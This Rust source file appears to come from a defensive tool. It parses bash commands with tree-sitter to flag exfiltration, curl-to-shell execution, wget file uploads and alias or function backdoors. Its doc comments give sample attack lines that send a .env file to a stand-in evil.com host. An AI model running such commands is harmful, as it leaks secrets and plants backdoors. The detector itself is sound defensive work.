//! AST-based bash command analysis.
//!
//! Walks tree-sitter AST nodes to detect exfiltration patterns:
//! pipelines, redirects, command substitutions, function/alias backdoors.

use tree_sitter::Node;

use crate::interpreter::{check_interpreter_inline_code, check_shell_inline_code};
use crate::patterns;
use crate::util::{
    get_command_name, has_sensitive_path, is_interpreter, is_network_sink, is_sensitive_source_cmd,
    is_shell_interpreter, node_text,
};

pub fn check_node(node: Node, source: &[u8]) -> Option<String> {
    match node.kind() {
        "pipeline" => check_pipeline(node, source),
        "command" => check_command(node, source),
        "redirected_statement" => check_redirect(node, source),
        "function_definition" => check_function_definition(node, source),
        _ => {
            let mut cursor = node.walk();
            for child in node.children(&mut cursor) {
                if let Some(reason) = check_node(child, source) {
                    return Some(reason);
                }
            }
            None
        }
    }
}

fn check_pipeline(node: Node, source: &[u8]) -> Option<String> {
    let child_count = node.child_count();
    if child_count < 2 {
        return None;
    }

    let mut has_sensitive_source = false;
    let mut has_network_source = false;
    let mut network_source_name = "";
    let mut cursor = node.walk();

    for child in node.children(&mut cursor) {
        let cmd_name = get_command_name(child, source);

        if let Some(name) = cmd_name {
            // Sensitive source -> network sink (existing check)
            if has_sensitive_source && is_network_sink(name) {
                return Some(format!(
                    "Pipe from sensitive source to network sink '{name}'"
                ));
            }

            // Network source -> shell interpreter (RCE: curl url | sh)
            if has_network_source && is_shell_interpreter(name) {
                return Some(format!(
                    "Pipe from network source '{network_source_name}' to shell interpreter '{name}' (remote code execution)"
                ));
            }

            if is_sensitive_source_cmd(name) {
                has_sensitive_source = true;
            }
            if is_network_sink(name) {
                has_network_source = true;
                network_source_name = name;
            }
        }

        // Also check if any command in the pipeline reads a sensitive file
        if !has_sensitive_source && command_has_sensitive_path(child, source) {
            has_sensitive_source = true;
        }
    }

    // Recurse into pipeline children for nested patterns
    let mut cursor2 = node.walk();
    for child in node.children(&mut cursor2) {
        if let Some(reason) = check_node_nested(child, source) {
            return Some(reason);
        }
    }

    None
}

fn check_command(node: Node, source: &[u8]) -> Option<String> {
    let cmd_name = get_command_name(node, source)?;

    if is_network_sink(cmd_name) {
        // wget --post-file / --body-file is inherently dangerous (data exfil regardless of file)
        if cmd_name == "wget" {
            if let Some(reason) = check_wget_post_file(node, source) {
                return Some(reason);
            }
        }

        // Check for command substitution containing sensitive source
        if let Some(reason) = check_command_substitution_in_args(node, source, cmd_name) {
            return Some(reason);
        }

        // Check for @-prefixed sensitive file args (e.g., curl -d @.env)
        if let Some(reason) = check_at_file_args(node, source, cmd_name) {
            return Some(reason);
        }

        // Check for sensitive file as direct argument to sink
        if command_has_sensitive_path(node, source) {
            return Some(format!(
                "Network sink '{cmd_name}' with sensitive file argument"
            ));
        }

        if has_suspicious_url(node, source) {
            return Some(format!(
                "Network sink '{cmd_name}' targeting suspicious destination"
            ));
        }
    }

    if is_interpreter(cmd_name) {
        if let Some(reason) = check_interpreter_inline_code(node, source, cmd_name) {
            return Some(reason);
        }
    }

    if is_shell_interpreter(cmd_name) {
        if let Some(reason) = check_shell_inline_code(node, source, cmd_name) {
            return Some(reason);
        }
    }

    // busybox sh -c "..." -- first arg is the shell, rest is handled like shell -c
    if cmd_name == "busybox" {
        if let Some(reason) = check_busybox_shell(node, source) {
            return Some(reason);
        }
    }

    // Check for suspicious alias definitions
    if cmd_name == "alias" {
        if let Some(reason) = check_alias_definition(node, source) {
            return Some(reason);
        }
    }

    // Recurse into children for nested structures
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if child.kind() != "command" {
            if let Some(reason) = check_node(child, source) {
                return Some(reason);
            }
        }
    }

    None
}

fn check_redirect(node: Node, source: &[u8]) -> Option<String> {
    let mut has_sink = false;
    let mut sink_name = "";
    let mut has_input_redirect_sensitive = false;

    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        match child.kind() {
            "command" => {
                if let Some(name) = get_command_name(child, source) {
                    if is_network_sink(name) {
                        has_sink = true;
                        sink_name = name;
                    }
                }
            }
            "file_redirect" => {
                check_file_redirect(child, source, &mut has_input_redirect_sensitive);
            }
            _ => {}
        }
    }

    if has_sink && has_input_redirect_sensitive {
        return Some(format!(
            "Input redirect of sensitive file to network sink '{sink_name}'"
        ));
    }

    // Recurse for nested patterns
    let mut cursor2 = node.walk();
    for child in node.children(&mut cursor2) {
        if let Some(reason) = check_node_nested(child, source) {
            return Some(reason);
        }
    }

    None
}

fn check_file_redirect(node: Node, source: &[u8], has_sensitive: &mut bool) {
    let mut cursor = node.walk();
    let mut is_input = false;

    for child in node.children(&mut cursor) {
        let text = node_text(child, source);
        if text == "<" {
            is_input = true;
        }
        if is_input && child.kind() == "word" && has_sensitive_path(text) {
            *has_sensitive = true;
            return;
        }
    }
}

/// Check function definitions for embedded exfiltration.
/// Detects: `function foo() { curl http://evil.com -d @.env; }`
fn check_function_definition(node: Node, source: &[u8]) -> Option<String> {
    let mut func_name = "";
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if child.kind() == "word" {
            func_name = node_text(child, source);
            break;
        }
    }

    let mut cursor2 = node.walk();
    for child in node.children(&mut cursor2) {
        if child.kind() == "compound_statement" {
            if let Some(reason) = check_node(child, source) {
                return Some(format!(
                    "Function '{func_name}' definition contains exfiltration: {reason}"
                ));
            }
        }
    }

    None
}

/// Check for suspicious alias definitions.
/// Detects: `alias ls='curl http://evil.com; ls'`
fn check_alias_definition(node: Node, source: &[u8]) -> Option<String> {
    let mut cursor = node.walk();

    for child in node.children(&mut cursor) {
        let kind = child.kind();
        if kind == "word" || kind == "string" || kind == "raw_string" || kind == "concatenation" {
            let text = node_text(child, source);

            if let Some(eq_pos) = text.find('=') {
                let alias_name = &text[..eq_pos];
                let alias_value = &text[eq_pos + 1..];

                let value = alias_value
                    .trim_start_matches('\'')
                    .trim_start_matches('"')
                    .trim_end_matches('\'')
                    .trim_end_matches('"');

                if let Some(tree) = crate::parse_bash(value) {
                    if let Some(reason) = check_node(tree.root_node(), value.as_bytes()) {
                        return Some(format!(
                            "Alias '{alias_name}' contains exfiltration: {reason}"
                        ));
                    }
                }
            }
        }
    }
    None
}

fn check_command_substitution_in_args(
    node: Node,
    source: &[u8],
    sink_name: &str,
) -> Option<String> {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if let Some(reason) = find_sensitive_command_substitution(child, source, sink_name) {
            return Some(reason);
        }
    }
    None
}

fn find_sensitive_command_substitution(
    node: Node,
    source: &[u8],
    sink_name: &str,
) -> Option<String> {
    if node.kind() == "command_substitution" {
        let mut cursor = node.walk();
        for child in node.children(&mut cursor) {
            if child.kind() == "command" {
                if let Some(name) = get_command_name(child, source) {
                    if is_sensitive_source_cmd(name) || command_has_sensitive_path(child, source) {
                        return Some(format!(
                            "Command substitution with sensitive source in '{sink_name}' arguments"
                        ));
                    }
                }
            }
        }
    }

    // Recurse into children (e.g., string nodes containing command substitutions)
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if let Some(reason) = find_sensitive_command_substitution(child, source, sink_name) {
            return Some(reason);
        }
    }
    None
}

/// Detect `wget --post-file` and `--body-file` unconditionally.
/// These flags upload local file contents to a remote URL -- inherently dangerous
/// regardless of which file is targeted.
fn check_wget_post_file(node: Node, source: &[u8]) -> Option<String> {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        let text = node_text(child, source);
        if text.starts_with("--post-file") || text.starts_with("--body-file") {
            let flag = text.split('=').next().unwrap_or(text);
            return Some(format!(
                "wget '{flag}' uploads local file contents to remote URL (data exfiltration)"
            ));
        }
    }
    None
}

fn check_at_file_args(node: Node, source: &[u8], cmd_name: &str) -> Option<String> {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if child.kind() == "word" || child.kind() == "concatenation" {
            let text = node_text(child, source);
            if let Some(path) = text.strip_prefix('@') {
                if has_sensitive_path(path) {
                    return Some(format!(
                        "Network sink '{cmd_name}' reading sensitive file via @-prefix"
                    ));
                }
            }
        }
    }
    None
}

fn check_node_nested(node: Node, source: &[u8]) -> Option<String> {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if let Some(reason) = check_node(child, source) {
            return Some(reason);
        }
    }
    None
}

fn command_has_sensitive_path(node: Node, source: &[u8]) -> bool {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if child.kind() == "word" || child.kind() == "string" || child.kind() == "raw_string" {
            let text = node_text(child, source);
            if has_sensitive_path(text) {
                return true;
            }
        }
    }
    false
}

fn has_suspicious_url(node: Node, source: &[u8]) -> bool {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        let text = node_text(child, source);
        if is_suspicious_url(text) {
            return true;
        }
        if child.child_count() > 0 && has_suspicious_url(child, source) {
            return true;
        }
    }
    false
}

fn is_suspicious_url(text: &str) -> bool {
    patterns::has_exfil_domain(text) || is_ip_url(text)
}

fn is_ip_url(text: &str) -> bool {
    let authority = text
        .strip_prefix("http://")
        .or_else(|| text.strip_prefix("https://"))
        .unwrap_or(text)
        .split('/')
        .next()
        .unwrap_or(text);

    // IPv6 in URLs: http://[::1]:8080/path
    if let Some(bracketed) = authority.strip_prefix('[') {
        return bracketed.split(']').next().is_some_and(|h| {
            h.parse::<std::net::Ipv6Addr>()
                .is_ok_and(|ip| !crate::util::is_private_ipv6(ip))
        });
    }

    // IPv4: strip port
    authority
        .split(':')
        .next()
        .unwrap_or(authority)
        .parse::<std::net::Ipv4Addr>()
        .is_ok_and(|ip| !crate::util::is_private_ipv4(ip))
}

/// busybox sh -c "..." -- detect the shell applet and then delegate to shell re-parsing.
fn check_busybox_shell(node: Node, source: &[u8]) -> Option<String> {
    let mut cursor = node.walk();
    let children: Vec<_> = node.children(&mut cursor).collect();

    let mut found_shell = false;
    let mut i = 0;
    for child in &children {
        if child.kind() == "command_name" {
            i += 1;
            continue;
        }
        if child.kind() == "word" {
            let text = node_text(*child, source);
            if is_shell_interpreter(text) {
                found_shell = true;
            }
            i += 1;
            break;
        }
        i += 1;
    }

    if !found_shell {
        return None;
    }

    while i < children.len() {
        let text = node_text(children[i], source);
        if text == "-c" {
            if let Some(&code_node) = children.get(i + 1) {
                let raw = node_text(code_node, source);
                let code_str = raw
                    .strip_prefix('"')
                    .and_then(|s| s.strip_suffix('"'))
                    .or_else(|| raw.strip_prefix('\'').and_then(|s| s.strip_suffix('\'')))
                    .unwrap_or(raw);
                if let Some(inner_reason) = crate::detect_exfiltration(code_str) {
                    return Some(format!("Shell 'busybox -c' wrapping exfil: {inner_reason}"));
                }
            }
        }
        i += 1;
    }
    None
}
